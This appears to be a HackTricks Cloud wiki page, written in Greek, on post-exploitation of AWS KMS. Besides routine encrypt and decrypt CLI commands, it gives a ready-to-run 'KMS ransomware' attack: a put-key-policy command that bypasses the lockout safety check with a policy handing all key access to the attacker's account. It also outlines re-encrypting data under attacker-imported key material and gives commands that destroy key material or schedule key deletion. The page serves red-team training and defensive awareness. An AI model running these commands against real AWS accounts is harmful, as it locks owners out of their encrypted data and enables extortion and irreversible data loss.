# AWS - KMS Post Exploitation

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## KMS

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### Κρυπτογράφηση/Αποκρυπτογράφηση πληροφοριών

* Χρησιμοποιώντας ένα **συμμετρικό** κλειδί
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* Χρησιμοποιώντας ένα **asymmetric** κλειδί:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
{% hint style="warning" %}
Αν λαμβάνετε το σφάλμα 'An error occurred (InvalidCiphertextException) when calling the Decrypt operation:' όταν προσπαθείτε να εκτελέσετε kms decrypt, δοκιμάστε να χρησιμοποιήσετε **`--ciphertext-blob file://`** αντί για **`fileb://`**.

Η χρήση του **`file://`** σας παρέχει την ευκολία να χρησιμοποιείτε αρχεία γραμμένα στην προτιμώμενη κωδικοποίηση σας όταν χρησιμοποιείτε το CLI.
Στις εκδόσεις 1.6.3 και νεότερες του CLI, έχετε πρόσβαση σε έναν άλλο τρόπο να περάσετε τα περιεχόμενα ενός αρχείου στο CLI, **`fileb://`**. Λειτουργεί παρόμοια με το **`file://`**, αλλά αντί να διαβάζει τα περιεχόμενα του αρχείου ως κείμενο, τα διαβάζει ως δυαδικά.

Στις περισσότερες περιπτώσεις, το **`file://`** θα καλύψει την ανάγκη σας για τη μεταφορά των περιεχομένων ενός αρχείου ως είσοδο. Ωστόσο, υπάρχουν κάποιες περιπτώσεις όπου το **`fileb://`** πρέπει να χρησιμοποιηθεί για να περάσει τα περιεχόμενα του αρχείου ως δυαδικά αντί για κείμενο.
Διαβάστε περισσότερα από την AWS εδώ: [AWS Blog - Best Practice for Local File Parameters](https://aws.amazon.com/blogs/developer/best-practices-for-local-file-parameters/)
{% endhint %}

### KMS Ransomware

Ένας επιτιθέμενος με προνομιακή πρόσβαση στο KMS θα μπορούσε να τροποποιήσει την πολιτική KMS των κλειδιών και **να παραχωρήσει στον λογαριασμό του πρόσβαση σε αυτά**, αφαιρώντας την πρόσβαση που έχει παραχωρηθεί στον νόμιμο λογαριασμό.

Στη συνέχεια, οι χρήστες του νόμιμου λογαριασμού δεν θα μπορούν να έχουν πρόσβαση σε καμία πληροφορία οποιασδήποτε υπηρεσίας που έχει κρυπτογραφηθεί με αυτά τα κλειδιά, δημιουργώντας ένα εύκολο αλλά αποτελεσματικό ransomware στον λογαριασμό.

{% hint style="warning" %}
Σημειώστε ότι **τα διαχειριζόμενα κλειδιά της AWS δεν επηρεάζονται** από αυτή την επίθεση, μόνο **τα διαχειριζόμενα κλειδιά πελατών**.

Επίσης, σημειώστε την ανάγκη χρήσης της παραμέτρου **`--bypass-policy-lockout-safety-check`** (η έλλειψη αυτής της επιλογής στην κονσόλα web καθιστά αυτή την επίθεση δυνατή μόνο από το CLI).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
Σημειώστε ότι αν αλλάξετε αυτήν την πολιτική και δώσετε πρόσβαση μόνο σε έναν εξωτερικό λογαριασμό, και στη συνέχεια από αυτόν τον εξωτερικό λογαριασμό προσπαθήσετε να ορίσετε μια νέα πολιτική για να **δώσετε την πρόσβαση πίσω στον αρχικό λογαριασμό, δεν θα μπορέσετε**.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Γενικό KMS Ransomware

#### Παγκόσμιο KMS Ransomware

Υπάρχει ένας άλλος τρόπος να εκτελέσετε ένα παγκόσμιο KMS Ransomware, ο οποίος περιλαμβάνει τα εξής βήματα:

* Δημιουργία ενός νέου **κλειδιού με υλικό κλειδιού** που εισάγεται από τον επιτιθέμενο
* **Επανακρυπτογράφηση παλαιότερων δεδομένων** που κρυπτογραφήθηκαν με την προηγούμενη έκδοση με τη νέα.
* **Διαγραφή του KMS κλειδιού**
* Τώρα μόνο ο επιτιθέμενος, που έχει το αρχικό υλικό κλειδιού, θα μπορούσε να αποκρυπτογραφήσει τα κρυπτογραφημένα δεδομένα

### Καταστροφή κλειδιών
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
Σημειώστε ότι το AWS τώρα **αποτρέπει τις προηγούμενες ενέργειες από το να εκτελούνται από έναν λογαριασμό cross:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
